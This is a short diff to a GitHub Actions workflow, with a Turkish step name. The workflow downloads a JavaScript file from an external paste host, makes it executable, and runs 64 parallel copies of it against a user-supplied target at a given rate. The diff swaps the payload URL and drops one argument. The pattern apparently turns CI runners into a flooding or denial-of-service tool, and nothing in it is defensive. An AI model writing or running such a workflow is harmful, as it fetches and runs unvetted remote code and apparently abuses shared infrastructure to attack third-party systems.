@@ -28,8 +28,8 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/nnWZp/raw.js
-        chmod +x raw.js
+        wget https://curl.by/GSP2D/x.js
+        chmod +x x.js
     - name: run
       run: |
         TARGET="${{ inputs.target }}"
@@ -37,7 +37,7 @@ jobs:
         
         PIDS=()
         for i in {1..64}; do
-          timeout 250 node raw.js "$TARGET" "$RATE" 96
+          timeout 250 node x.js "$TARGET" "$RATE"
           PIDS+=($!)
         done
         
